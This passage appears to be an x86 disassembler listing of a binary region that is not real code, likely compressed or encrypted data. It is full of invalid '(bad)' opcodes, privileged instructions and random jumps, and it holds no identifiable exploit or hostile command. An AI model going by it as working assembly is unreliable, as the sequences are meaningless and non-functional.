  427661:	(bad)  
  427662:	mov    dh,0x57
  427664:	push   esi
  427665:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427666:	(bad)  
  427667:	mov    dl,0xe5
  427669:	and    BYTE PTR [edx-0x22],dh
  42766c:	cmp    al,0xaf
  42766e:	mov    al,ds:0xcbed18b6
  427673:	icebp  
  427674:	add    eax,0x1f72ac06
  427679:	pop    edi
  42767a:	js     0x427610
  42767c:	or     BYTE PTR [eax+ebx*2],al
  42767f:	mov    ch,0x4e
  427681:	xor    eax,0x77cea57e
  427686:	xor    eax,0x5ce4c6cd
  42768b:	mov    edx,0xecf021b4
  427690:	sar    BYTE PTR [edx+0x26],cl
  427693:	dec    esp
  427694:	int3   
  427695:	dec    ecx
  427696:	jp     0x4276f2
  427698:	clc    
  427699:	sbb    eax,ecx
  42769b:	into   
  42769c:	or     eax,0x5aa0ecbf
  4276a1:	lods   al,BYTE PTR ds:[esi]
  4276a2:	mov    cl,0xf7
  4276a4:	pop    ss
  4276a5:	leave  
  4276a6:	xlat   BYTE PTR ds:[ebx]
  4276a7:	int    0x61
  4276a9:	push   edx
  4276aa:	ret    
  4276ab:	mov    cl,0x60
  4276ad:	sbb    edi,DWORD PTR [ebp-0x61f68781]
  4276b3:	je     0x4276b6
  4276b5:	out    dx,al
  4276b6:	int    0x4b
  4276b8:	jecxz  0x427691
  4276ba:	pminub mm5,QWORD PTR [eax+esi*8-0x5b6b5e05]
  4276c2:	mov    ebp,0x990d8fdd
  4276c7:	pop    ss
  4276c8:	mov    bh,0x7f
  4276ca:	scas   al,BYTE PTR es:[edi]
  4276cb:	adc    cl,cl
  4276cd:	imul   eax,DWORD PTR [ebx-0x12],0xfe749f46
  4276d4:	sub    eax,DWORD PTR [eax]
  4276d6:	push   edi
  4276d7:	mov    DWORD PTR [eax-0x55872c29],edi
  4276dd:	mov    eax,0xc3725545
  4276e2:	hlt    
  4276e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4276e5:	mov    ah,0xff
  4276e7:	jecxz  0x427712
  4276e9:	mov    ds:0xaf056389,eax
  4276ee:	pop    ebp
  4276ef:	inc    ebp
  4276f0:	cli    
  4276f1:	dec    ebx
  4276f2:	xchg   edi,eax
  4276f3:	repnz add edi,0xffffffa3
  4276f7:	push   ss
  4276f8:	jo     0x4276d8
  4276fa:	push   ecx
  4276fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4276fc:	and    eax,0x115a7a53
  427701:	ja     0x427743
  427703:	add    edx,ebp
  427705:	mov    ch,0x41
  427707:	push   0xfffffff4
  427709:	jbe    0x427776
  42770b:	add    DWORD PTR [edi-0x56],0x143ffe30
  427712:	icebp  
  427713:	xchg   ebx,eax
  427714:	fs call 0xa77ec349
  42771a:	pop    es
  42771b:	fmul   DWORD PTR [ebx+0x46]
  42771e:	pop    ecx
  42771f:	or     ebp,ebx
  427721:	js     0x427792
  427723:	push   ecx
  427724:	mov    ?,WORD PTR [edx+edi*4-0x7e]
  427728:	rol    ebx,0xdf
  42772b:	push   cs
  42772c:	push   edi
  42772d:	push   0xffffffe9
  42772f:	pop    ecx
  427730:	and    BYTE PTR [ebx+0x4a05067],0x9d
  427737:	iret   
  427738:	add    DWORD PTR [edi+0x23606e54],edi
  42773e:	scas   al,BYTE PTR es:[edi]
  42773f:	pop    ss
  427740:	dec    esi
  427741:	mov    edi,0x63a45bad
  427746:	jns    0x4276d8
  427748:	jae    0x427704
  42774a:	lods   al,BYTE PTR ds:[esi]
  42774b:	add    BYTE PTR [edi],bl
  42774d:	je     0x4276f4
  42774f:	ins    DWORD PTR es:[edi],dx
  427750:	dec    eax
  427751:	(bad)  
  427752:	loopne 0x427747
  427754:	adc    esp,eax
  427756:	loopne 0x42779a
  427758:	fld    QWORD PTR [esi+0x6665d60]
  42775e:	ret    0x4c40
  427761:	sub    ch,BYTE PTR [edx+0x439849d0]
  427767:	(bad)  
  427768:	sbb    al,0x1f
  42776a:	push   ss
  42776b:	leave  
  42776c:	sbb    ecx,DWORD PTR [edx-0x17097e64]
  427772:	pop    edx
  427773:	scas   al,BYTE PTR es:[edi]
  427774:	or     eax,0x6012610d
  427779:	sbb    bh,al
  42777b:	xchg   ebp,eax
  42777c:	ds mov bh,0xc3
  42777f:	retf   
  427780:	(bad)  
  427781:	sbb    DWORD PTR [edx],eax
  427783:	jle    0x4277a8
  427785:	out    0xf1,eax
  427787:	mov    ds:0x17a8d349,eax
  42778c:	in     eax,dx
  42778d:	sub    al,0x45
  42778f:	hlt    
  427790:	mov    ch,0x69
  427792:	sbb    ebx,DWORD PTR [ebx]
  427794:	sti    
  427795:	mov    eax,ds:0x757b4fa2
  42779a:	cmp    cl,BYTE PTR [edi+eax*4+0x312fa243]
  4277a1:	pop    ebx
  4277a2:	out    0xbc,eax
  4277a4:	xchg   esp,eax
  4277a5:	aas    
  4277a6:	es push cs
  4277a8:	push   cs
  4277a9:	fild   QWORD PTR [edx+0x44bf3ae5]
  4277af:	or     eax,0xe07aa1c4
  4277b4:	jp     0x427819
  4277b6:	stos   DWORD PTR es:[edi],eax
	...
  4277bf:	add    BYTE PTR [eax],al
  4277c1:	sub    al,0x44
  4277c3:	and    edi,DWORD PTR [eax+0x6b]
  4277c6:	jg     0x427847
  4277c8:	push   esp
  4277c9:	adc    edi,DWORD PTR [ebp-0x1ac15d8a]
  4277cf:	mov    bh,0xa2
  4277d1:	and    ebp,esi
  4277d3:	add    DWORD PTR [eax],eax
  4277d5:	scas   al,BYTE PTR es:[edi]
  4277d6:	add    eax,DWORD PTR [eax]
  4277d8:	add    BYTE PTR [ecx-0x43],al
  4277db:	cmp    DWORD PTR [eax],edx
  4277dd:	add    dl,BYTE PTR [edi-0x3b860bc9]
  4277e3:	push   ss
  4277e4:	mov    dl,BYTE PTR [esi]
  4277e6:	push   ss
  4277e7:	mov    ds:0x425cd8a7,eax
  4277ec:	call   0x6f51:0x1c6bed3
  4277f3:	sbb    dh,BYTE PTR [esi]
  4277f5:	xor    ah,dh
  4277f7:	cdq    
  4277f8:	imul   edx,DWORD PTR [esp+esi*4],0x4e
  4277fc:	mov    db4,esi
  4277ff:	int    0x2
  427801:	sub    ebx,DWORD PTR [eax-0x7404e96]
  427807:	test   eax,0xfc4dde4e
  42780c:	enter  0x2b04,0xc0
  427810:	xor    edi,DWORD PTR [esp+eiz*8+0x6693fe]
  427817:	jnp    0x42781f
  427819:	imul   esi,eax,0x1d61a3f7
  42781f:	cld    
  427820:	dec    ebx
  427821:	(bad)  
  427822:	dec    ebx
  427823:	adc    ch,BYTE PTR [ebp+0x3febd62e]
  427829:	fstp   st(2)
  42782b:	stos   BYTE PTR es:[edi],al
  42782c:	ins    BYTE PTR es:[edi],dx
  42782d:	sti    
  42782e:	jno    0x42789e
  427830:	int3   
  427831:	dec    esp
  427832:	test   DWORD PTR [ebx],0xb0b360b
  427838:	pop    esi
  427839:	push   ecx
  42783a:	sahf   
  42783b:	jae    0x427823
  42783d:	jp     0x4277ec
  42783f:	shl    BYTE PTR [ebx+0x7b7106f6],0x5d
  427846:	sbb    BYTE PTR [ecx+0x5cdf62dd],0x7d
  42784d:	retf   0x4ace
  427850:	je     0x427800
  427852:	iret   
  427853:	push   es
  427854:	push   0x32
  427856:	sbb    BYTE PTR [edx-0x6f],dl
  427859:	push   es
  42785a:	push   cs
  42785b:	mov    ds,WORD PTR [ecx+0x50b757bd]
  427861:	into   
  427862:	jmp    0x4278bf
  427864:	push   ecx
  427865:	fsubr  st,st(5)
  427867:	das    
  427868:	ins    BYTE PTR es:[edi],dx
  427869:	fsubr  QWORD PTR [edx]
  42786b:	or     esp,esp
  42786d:	jmp    0xf106:0x2ed2cb10
  427874:	data16 ins BYTE PTR es:[edi],dx
  427876:	inc    eax
  427877:	sbb    dh,al
  427879:	loop   0x42786e
  42787b:	popf   
  42787c:	sbb    BYTE PTR [edi+0x3f873c35],ch
  427882:	leave  
  427883:	(bad)  
  427884:	sti    
  427885:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427886:	pop    ebp
  427887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427888:	jge    0x427852
  42788a:	sbb    dl,ah
  42788c:	mov    es,edi
  42788e:	fsubp  st(2),st
  427890:	test   DWORD PTR [eax-0x5c],ecx
  427893:	push   es
  427894:	cmp    bh,BYTE PTR [edi+0x30533c2e]
  42789a:	sbb    BYTE PTR [edx-0x3d069e01],0xf7
  4278a1:	shr    DWORD PTR [ebx+0x3dc8fdc7],1
  4278a7:	ins    DWORD PTR es:[edi],dx
  4278a8:	dec    ebp
  4278a9:	jns    0x4278df
  4278ab:	push   eax
  4278ac:	outs   dx,DWORD PTR ds:[esi]
  4278ad:	div    DWORD PTR [ecx]
  4278af:	adc    DWORD PTR [ebx-0x515663aa],eax
  4278b5:	adc    dh,BYTE PTR [esi-0x45c23cd5]
  4278bb:	mov    eax,0xd3722b05
  4278c0:	inc    ebp
  4278c1:	ds push ecx
  4278c3:	add    cl,0xcf
  4278c6:	out    dx,al
  4278c7:	inc    ecx
  4278c8:	push   edx
  4278c9:	aaa    
  4278ca:	adc    ebx,ebp
  4278cc:	loope  0x427870
  4278ce:	dec    esi
  4278cf:	cmp    edx,esi
  4278d1:	sti    
  4278d2:	and    DWORD PTR [ecx],edx
  4278d4:	inc    esp
  4278d5:	icebp  
  4278d6:	jg     0x427948
  4278d8:	mov    dh,BYTE PTR [edi]
  4278da:	mov    ecx,ebx
  4278dc:	mov    esp,0x71b707db
  4278e1:	jle    0x4278de
  4278e3:	scas   eax,DWORD PTR es:[edi]
  4278e4:	std    
  4278e5:	inc    edx
  4278e6:	inc    esi
  4278e7:	shl    BYTE PTR [ebx-0x17],0xb
  4278eb:	sub    al,0x4a
  4278ed:	push   ecx
  4278ee:	and    ecx,esp
  4278f0:	hlt    
  4278f1:	repnz out 0xcf,al
  4278f4:	xchg   edx,eax
  4278f5:	dec    edx
  4278f6:	mov    eax,0x2251b329
  4278fb:	cwde   
  4278fc:	jae    0x427897
  4278fe:	rcr    BYTE PTR [esi+ebx*2],cl
  427901:	adc    DWORD PTR [edx+edi*1-0x4c],ebx
  427905:	xchg   ecx,eax
  427906:	leave  
  427907:	and    cl,dh
  427909:	mov    ds:0x506eb56b,eax
  42790e:	lods   al,BYTE PTR ds:[esi]
  42790f:	mov    ebp,0xc1f0816e
  427914:	mov    ecx,0xb400a6d8
  427919:	and    ebp,ebp
  42791b:	daa    
  42791c:	repz aas 
  42791e:	add    eax,0x400782c1
  427923:	cld    
  427924:	(bad)  
  427925:	sbb    DWORD PTR gs:[edi+eax*4+0x4c],0x3a
  42792b:	mov    esp,0x9b0de724
  427930:	jp     0x4279ad
  427932:	loop   0x42799d
  427934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427935:	push   ebp
  427936:	pop    ebx
  427937:	mov    ecx,0xe9a80a1
  42793c:	imul   ecx,ebp,0x7a
  42793f:	fldlg2 
  427941:	xor    eax,0x81bbaac1
  427946:	and    al,0xed
  427948:	xor    esp,DWORD PTR [esi+0x5a3c05df]
  42794e:	lods   eax,DWORD PTR ds:[esi]
  42794f:	das    
  427950:	into   
  427951:	fimul  WORD PTR [edi]
  427953:	rol    DWORD PTR [eax],0xf1
  427956:	adc    ah,ch
  427958:	lock into 
  42795a:	aaa    
  42795b:	sar    BYTE PTR [edi-0x676a140],1
  427961:	pop    es
  427962:	jmp    0xb67af5d6
  427967:	mov    ds:0xd4082b4,eax
  42796c:	add    eax,0x35f9556e
  427971:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  427973:	or     cl,ch
  427975:	in     al,0xd8
  427977:	ja     0x427965
  427979:	loop   0x427998
  42797b:	dec    edi
  42797c:	ds adc eax,0x682afc88
  427982:	fldcw  WORD PTR [ecx]
  427984:	push   ebx
  427985:	mov    ds,WORD PTR [bx]
  427988:	(bad)  
  427989:	in     eax,dx
  42798a:	cdq    
  42798b:	pop    edx
  42798c:	mov    WORD PTR [ecx-0x67d35a43],es
  427992:	jnp    0x427a04
  427994:	jns    0x427978
  427996:	loope  0x42791a
  427998:	call   0x9a53:0xc6229bae
  42799f:	int3   
  4279a0:	pushf  
  4279a1:	lea    ecx,gs:[ecx]
  4279a4:	popa   
  4279a5:	adc    al,0x91
  4279a7:	(bad)  
  4279a8:	stos   DWORD PTR es:[edi],eax
  4279a9:	(bad)  
  4279aa:	out    dx,eax
  4279ab:	dec    ebp
  4279ac:	xor    ebx,DWORD PTR [ecx-0x3b70b101]
  4279b2:	hlt    
  4279b3:	mov    ds:0x90a91ead,eax
  4279b8:	inc    ebp
  4279b9:	std    
  4279ba:	out    dx,al
  4279bb:	mov    ch,0xad
  4279bd:	lods   al,BYTE PTR ds:[esi]
  4279be:	sbb    edi,esp
  4279c0:	mov    BYTE PTR [edx],bl
  4279c2:	in     eax,0x2a
  4279c4:	arpl   WORD PTR [eax+0x3c],cx
  4279c7:	in     al,0xfd
  4279c9:	mov    esi,DWORD PTR [ebx+0x44]
  4279cc:	ret    0x51f7
  4279cf:	mov    eax,ds:0x9cd41fe4
  4279d4:	add    bh,BYTE PTR [esi]
  4279d6:	ja     0x4279e5
  4279d8:	jle    0x4279de
  4279da:	fdivp  st(0),st
  4279dc:	inc    edx
  4279dd:	adc    BYTE PTR [ecx],0xb5
  4279e0:	loopne 0x427a03
  4279e2:	lock pop esi
  4279e4:	xor    dh,BYTE PTR [eax+0x13]
  4279e7:	sbb    al,0x37
  4279e9:	adc    bl,BYTE PTR [edx+0x54]
  4279ec:	add    eax,0x972235b3
  4279f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279f2:	mov    ds:0xb51216da,eax
  4279f7:	addr16 dec eax
  4279f9:	or     DWORD PTR [ebx],ecx
  4279fb:	mov    ebp,0x69498f86
  427a00:	gs std 
  427a02:	dec    edx
  427a03:	xchg   edi,eax
  427a04:	loop   0x4279a1
  427a06:	fist   WORD PTR [ebx+0x40]
  427a09:	ret    
  427a0a:	aaa    
  427a0b:	sar    BYTE PTR [ebp-0x19fccbb1],0xaf
  427a12:	icebp  
  427a13:	jae    0x4279c2
  427a15:	dec    ecx
  427a16:	in     al,dx
  427a17:	jnp    0x427a64
  427a19:	ja     0x427a8a
  427a1b:	mov    bh,0x83
  427a1d:	in     al,0x4e
  427a1f:	mov    esi,0x7ebe17c
  427a24:	adc    ecx,DWORD PTR [edx-0x7407d71b]
  427a2a:	push   0x5f
  427a2c:	mov    dl,0x11
  427a2e:	mov    ecx,0x4eb50ccc
  427a33:	outs   dx,DWORD PTR ds:[esi]
  427a34:	dec    edi
  427a35:	sub    al,0x64
  427a37:	test   edi,esp
  427a39:	shl    DWORD PTR [eax+0x6a],1
  427a3c:	xor    cl,BYTE PTR [edx+0x134f5762]
  427a42:	call   0x9ff6:0x7ab3d8d8
  427a49:	in     al,0x10
  427a4b:	push   0x620d44d9
  427a50:	inc    esi
  427a51:	mov    ?,edx
  427a53:	sbb    ecx,esp
  427a55:	std    
  427a56:	fwait
  427a57:	scas   al,BYTE PTR es:[edi]
  427a58:	(bad)  
  427a59:	adc    ebp,DWORD PTR [ebx-0x5a]
  427a5c:	enter  0xb73b,0x16
  427a60:	nop
  427a61:	sub    eax,ebp
  427a63:	ds call 0x66a141e5
  427a69:	fldcw  WORD PTR [ecx-0x69]
  427a6c:	inc    edx
  427a6d:	in     al,dx
  427a6e:	push   cs
  427a6f:	js     0x427a9d
  427a71:	lahf   
  427a72:	push   0x18847892
  427a77:	cmp    al,0xa9
  427a79:	stc    
  427a7a:	jmp    0xe0e51fa2
  427a7f:	mov    cl,0xea
  427a81:	sub    edx,esi
  427a83:	jns    0x427a7c
  427a85:	dec    edi
  427a86:	mov    dl,0xa2
  427a88:	jbe    0x427a55
  427a8a:	cmp    DWORD PTR [esi-0x78],ebx
  427a8d:	push   ecx
  427a8e:	xlat   BYTE PTR ds:[ebx]
  427a8f:	push   esp
  427a90:	dec    edi
  427a91:	mov    ah,0xc7
  427a93:	sub    eax,0x86692bb8
  427a98:	mov    ecx,0xcc5902dc
  427a9d:	pushf  
  427a9e:	jmp    0x427a45
  427aa0:	mov    eax,0xea91a640
  427aa5:	or     DWORD PTR [ebp+0x15],edx
  427aa8:	shl    DWORD PTR [ebx-0x48f4e2df],0x62
  427aaf:	jmp    0x427a9f
  427ab1:	mov    eax,0x4896e4df
  427ab6:	fld    QWORD PTR ds:0xb9cf5166
  427abc:	shl    BYTE PTR ds:0x9d33d944,cl
  427ac2:	and    BYTE PTR [ebx+0x4a],0xde
  427ac6:	xor    ah,0x43
  427ac9:	inc    esi
  427aca:	(bad)  
  427acb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427acc:	xlat   BYTE PTR ds:[ebx]
  427acd:	mov    esp,0xf8405b0b
  427ad2:	push   cs
  427ad3:	out    0x94,al
  427ad5:	xor    edx,DWORD PTR [edi+0x4b8aace5]
  427adb:	andps  xmm2,xmm6
  427ade:	hlt    
  427adf:	xchg   ebp,eax
  427ae0:	fldcw  WORD PTR [eax]
  427ae2:	fs mov ah,dl
  427ae5:	xchg   ebx,eax
  427ae6:	sbb    al,0xd7
  427ae8:	loope  0x427a9d
  427aea:	and    eax,ebp
  427aec:	les    esp,FWORD PTR [esi+0x35]
  427aef:	sahf   
  427af0:	inc    edx
  427af1:	pop    ecx
  427af2:	mov    ebx,0x826d2147
  427af7:	push   ebx
  427af8:	fstp   QWORD PTR [ebp-0x32096dcb]
  427afe:	inc    esp
  427aff:	sbb    al,0xd3
  427b01:	scas   al,BYTE PTR es:[edi]
  427b02:	push   ss
  427b03:	mov    ds:0x18d1b6b7,al
  427b08:	jg     0x427b6d
  427b0a:	mov    ds:0x23ad64b3,eax
  427b0f:	std    
  427b10:	mov    eax,ds:0x2cdf4489
  427b15:	dec    edx
  427b16:	into   
  427b17:	pop    esi
  427b18:	mov    esi,0xfdb6b3f3
  427b1d:	adc    dh,BYTE PTR es:[edi+0x5a]
  427b21:	cmp    edi,DWORD PTR [edx+0x13]
  427b24:	ss pop es
  427b26:	jo     0x427b24
  427b28:	sbb    dl,dh
  427b2a:	(bad)  
  427b2b:	out    dx,al
  427b2c:	imul   edi,DWORD PTR ds:0x1415baa8,0x53
  427b33:	xor    cl,al
  427b35:	mov    dh,0xbf
  427b37:	mov    esi,0xf48ab845
  427b3c:	out    0x73,eax
  427b3e:	cmp    bl,bl
  427b40:	(bad)  
  427b42:	scas   al,BYTE PTR es:[edi]
  427b43:	jl     0x427b2a
  427b45:	xchg   BYTE PTR [edi+0x6330891a],ah
  427b4b:	fbstp  TBYTE PTR [esi-0x578348a1]
  427b51:	mov    ah,0x25
  427b53:	aad    0x9e
  427b55:	loope  0x427b23
  427b57:	rcl    BYTE PTR [edi],0x5
  427b5a:	xor    esi,ecx
  427b5c:	(bad)  
  427b5e:	shl    DWORD PTR [esi-0x82550e2],1
  427b64:	test   BYTE PTR [ecx+0x1143df43],0x6c
  427b6b:	sub    ecx,ebp
  427b6d:	out    dx,eax
  427b6e:	sbb    ch,BYTE PTR [edx-0x23f8d369]
  427b74:	cli    
  427b75:	test   BYTE PTR [edi-0x41],cl
  427b78:	stos   DWORD PTR es:[edi],eax
  427b79:	and    edi,DWORD PTR [esp+ecx*2-0x45f67cf3]
  427b80:	enter  0xad9c,0x85
  427b84:	mov    esp,0x4620
	...
  427b91:	sub    esp,eax
  427b93:	jnp    0x427bcd
  427b95:	sti    
  427b96:	mov    ebx,0x345ef36b
  427b9b:	aaa    
  427b9c:	mov    DWORD PTR [edi+ebx*2],edx
  427b9f:	sub    eax,0x1f1d19f
  427ba4:	add    BYTE PTR [esi+0x29000003],ch
  427baa:	adc    BYTE PTR [edi+0x6],bl
  427bad:	popa   
  427bae:	lds    edi,FWORD PTR [eax]
  427bb0:	retf   0xd570
  427bb3:	push   edx
  427bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427bb5:	add    eax,0x178e30b5
  427bba:	jecxz  0x427bc5
  427bbc:	jae    0x427bc0
  427bbe:	shr    BYTE PTR [ebp-0x24],cl
  427bc1:	sub    bh,BYTE PTR [edx+0x2c24df9c]
  427bc7:	loop   0x427b7b
  427bc9:	dec    esi
  427bca:	(bad)  [eax+0x5dc85c20]
  427bd0:	adc    ch,bh
  427bd2:	ins    BYTE PTR es:[edi],dx
  427bd3:	xor    esp,DWORD PTR [ecx]
  427bd5:	cmp    al,0x53
  427bd7:	jp     0x427bcb
  427bd9:	(bad)  
  427bda:	out    dx,eax
  427bdb:	adc    bh,dl
  427bdd:	in     al,dx
  427bde:	loope  0x427c18
  427be0:	push   cs
  427be1:	push   eax
  427be2:	add    edi,DWORD PTR [edi+edx*4]
  427be5:	add    bl,0x27
  427be8:	loop   0x427bee
  427bea:	xor    eax,0x90236845
  427bef:	loopne 0x427bcd
  427bf1:	pop    esp
  427bf2:	call   0x140b:0x7fe0189b
  427bf9:	fdiv   QWORD PTR [eax+0x17aef346]
  427bff:	imul   esp,DWORD PTR [ecx],0x498bbcf
  427c05:	hlt    
  427c06:	xchg   edi,eax
  427c07:	push   ecx
  427c08:	das    
  427c09:	int    0x4d
  427c0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c0c:	xchg   esp,eax
  427c0d:	jecxz  0x427be8
  427c0f:	push   ebx
  427c10:	adc    al,0xce
  427c12:	mov    al,ds:0xa312e4d6
  427c17:	mov    ecx,DWORD PTR [esi+0x55]
  427c1a:	ret    
  427c1b:	dec    edi
  427c1c:	xor    ebx,DWORD PTR [ebx-0xe]
  427c1f:	cmp    ch,cl
  427c21:	push   es
  427c22:	fwait
  427c23:	and    eax,0x4ed1517b
  427c28:	out    dx,eax
  427c29:	out    0x66,eax
  427c2b:	leave  
  427c2c:	add    ecx,DWORD PTR [ebx+0x234c4f6f]
  427c32:	in     eax,0x9a
  427c34:	stos   DWORD PTR es:[edi],eax
  427c35:	pop    edx
  427c36:	enter  0xf59,0xe8
  427c3a:	cmc    
  427c3b:	fcomip st,st(3)
  427c3d:	popa   
  427c3e:	mov    al,BYTE PTR [ecx]
  427c40:	fnstenv [eax]
  427c42:	aad    0x3d
  427c44:	mov    ch,BYTE PTR [edi+eax*4-0x7]
  427c48:	push   ecx
  427c49:	rcr    BYTE PTR [edi],1
  427c4b:	dec    esi
  427c4c:	out    dx,al
  427c4d:	mov    ebp,0x50f88211
  427c52:	mov    bh,BYTE PTR [edi-0x610441a3]
  427c58:	mov    bl,0x4f
  427c5a:	je     0x427c85
  427c5c:	mov    ch,0x8d
  427c5e:	(bad)  
  427c5f:	icebp  
  427c60:	ja     0x427c60
  427c62:	sub    al,0x81
  427c64:	call   0x2fcf:0xb6daaf31
  427c6b:	xor    al,0xb4
  427c6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c70:	adc    eax,0xf78ea454
  427c75:	cmc    
  427c76:	jle    0x427cc1
  427c78:	xor    cl,BYTE PTR [edx]
  427c7a:	mov    eax,ds:0x382b433c
  427c7f:	cmp    DWORD PTR [edx],edi
  427c81:	test   bx,sp
  427c84:	mov    ds:0x991d1045,al
  427c89:	push   ebx
  427c8a:	fwait
  427c8b:	(bad)  
  427c8c:	and    BYTE PTR [edi],0xec
  427c8f:	imul   esp,DWORD PTR [ecx+ebx*8+0x30],0x1f95f764
  427c97:	sbb    al,BYTE PTR [esi+0x41]
  427c9a:	dec    esi
  427c9b:	xchg   ebp,eax
  427c9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c9d:	(bad)  
  427c9e:	push   cs
  427c9f:	add    al,0xe1
  427ca1:	retf   0x2654
  427ca4:	daa    
  427ca5:	jecxz  0x427d20
  427ca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ca8:	sti    
  427ca9:	gs pop ecx
  427cab:	out    dx,eax
  427cac:	add    edx,DWORD PTR ds:0x4f2874d3
  427cb2:	adc    BYTE PTR ds:0x6fdcfa7,bh
  427cb8:	lahf   
  427cb9:	(bad)  
  427cbb:	outs   dx,BYTE PTR ds:[esi]
  427cbc:	and    DWORD PTR [edx],0xa3c3133a
  427cc2:	push   edx
  427cc3:	push   cs
  427cc4:	inc    eax
  427cc5:	push   es
  427cc6:	and    al,BYTE PTR [esp+esi*2+0x28]
  427cca:	rcl    ebx,cl
  427ccc:	shl    DWORD PTR [ecx-0x6cf690a5],1
  427cd2:	lahf   
  427cd3:	or     eax,0x472af165
  427cd8:	and    BYTE PTR [edx+0x8],bl
  427cdb:	sbb    eax,0xbae60394
  427ce0:	mov    ebp,0x5f2a134f
  427ce5:	popa   
  427ce6:	dec    edi
  427ce7:	fwait
  427ce8:	pop    ebp
  427ce9:	adc    bh,BYTE PTR es:[edx-0x24d8b690]
  427cf0:	or     ebp,DWORD PTR [edx+0x3f]
  427cf3:	ins    DWORD PTR es:[edi],dx
  427cf4:	jle    0x427d1a
  427cf6:	fld    QWORD PTR [edi+0x3cfcbab8]
  427cfc:	mov    cl,0x48
  427cfe:	or     ecx,eax
  427d00:	cmp    dh,BYTE PTR [ebx]
  427d02:	cwde   
  427d03:	xor    esp,eax
  427d05:	sbb    eax,0x61520e6e
  427d0a:	stc    
  427d0b:	inc    eax
  427d0c:	stos   DWORD PTR es:[edi],eax
  427d0d:	inc    ebp
  427d0e:	mov    dl,0x55
  427d10:	xor    ecx,DWORD PTR [eax+esi*1+0x60]
  427d14:	or     eax,0x78f94ec2
  427d19:	stos   BYTE PTR es:[edi],al
  427d1a:	inc    edx
  427d1b:	dec    edx
  427d1c:	mov    esp,0x5b1acbc1
  427d21:	xlat   BYTE PTR ds:[ebx]
  427d22:	xchg   ecx,eax
  427d23:	bound  eax,QWORD PTR [ebp-0x1f]
  427d26:	xor    DWORD PTR [edx+0x45],eax
  427d29:	into   
  427d2a:	(bad)  
  427d2b:	dec    ebx
  427d2c:	sub    al,0x90
  427d2e:	mov    eax,0x130da8d6
  427d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d34:	jns    0x427d5e
  427d36:	xchg   esp,eax
  427d37:	push   ss
  427d38:	lds    esp,FWORD PTR [ebp+0x687b7b0a]
  427d3e:	js     0x427d32
  427d40:	sbb    al,0x8b
  427d42:	retf   0x56e
  427d45:	mov    ah,0x3d
  427d47:	push   esi
  427d48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d49:	and    BYTE PTR [ebx+0x6a],cl
  427d4c:	push   0x1d
  427d4e:	dec    ebp
  427d4f:	ds mov bl,0xd3
  427d52:	jno    0x427d6a
  427d54:	dec    ebp
  427d55:	int3   
  427d56:	call   0x46e1:0xfdcf372e
  427d5d:	jae    0x427d46
  427d5f:	mov    bl,0xb2
  427d61:	in     eax,0x9f
  427d63:	xlat   BYTE PTR ds:[ebx]
  427d64:	xor    esp,ebp
  427d66:	sub    eax,0x67cbd3a6
  427d6b:	fs xchg ecx,eax
  427d6d:	xor    esi,0x8ccde9c7
  427d73:	jb     0x427d86
  427d75:	imul   ebx,DWORD PTR [esi+0x26],0xffffffdb
  427d79:	cmp    ah,BYTE PTR [eax]
  427d7b:	add    eax,0x166ec725
  427d80:	pop    ebx
  427d81:	lds    eax,FWORD PTR [ebp+0x2888ec74]
  427d87:	aad    0x53
  427d89:	mov    ecx,0xcfe9c750
  427d8e:	iret   
  427d8f:	adc    BYTE PTR [esp+ebp*4-0x42],cl
  427d93:	and    ebx,esp
  427d95:	(bad)  
  427d96:	jl     0x427d26
  427d98:	mov    cl,0xf5
  427d9a:	jmp    0x427d87
  427d9c:	fsubr  QWORD PTR [esi+0x21f1550a]
  427da2:	xchg   ecx,eax
  427da3:	mov    DWORD PTR gs:[esi+0x57448f25],ebx
  427daa:	adc    BYTE PTR [esi+0x25],dh
  427dad:	pop    eax
  427dae:	mov    esi,0xc9e773a3
  427db3:	mov    ecx,DWORD PTR [edx+esi*2-0x5d37b424]
  427dba:	out    dx,al
  427dbb:	jbe    0x427dbe
  427dbd:	jmp    0x831cba7a
  427dc2:	imul   BYTE PTR [esp+eiz*8+0x689394a9]
  427dc9:	loope  0x427dd9
  427dcb:	icebp  
  427dcc:	clc    
  427dcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427dce:	cmp    eax,0xc712d0a9
  427dd3:	(bad)  
  427dd5:	out    dx,al
  427dd6:	mov    esi,0x54d70186
  427ddb:	clc    
  427ddc:	ret    
  427ddd:	das    
  427dde:	fstp   DWORD PTR [eax]
  427de0:	sbb    DWORD PTR [esp+0x653c688e],ecx
  427de7:	and    bl,BYTE PTR [ebp-0x664b741b]
  427ded:	fwait
  427dee:	icebp  
  427def:	jbe    0x427dad
  427df1:	ror    BYTE PTR [ecx-0x6ff6b892],0x98
  427df8:	xor    BYTE PTR [eax+ecx*1],bh
  427dfb:	xchg   ecx,eax
  427dfc:	xchg   ebp,eax
  427dfd:	jb     0x427dd3
  427dff:	pop    ds
  427e00:	cmp    eax,0x4bfad50f
  427e05:	leave  
  427e06:	into   
  427e07:	or     eax,0x47e166ba
  427e0c:	and    edi,DWORD PTR [eax+0x78048ee6]
  427e12:	xchg   ebx,eax
  427e13:	rcl    cl,0xf5
  427e16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e17:	mov    bl,0x64
  427e1a:	addr16 dec edx
  427e1c:	ja     0x427e1f
  427e1e:	fiadd  DWORD PTR [edi-0x9d3940]
  427e24:	push   ss
  427e25:	call   0xee4a2d6f
  427e2a:	ins    DWORD PTR es:[edi],dx
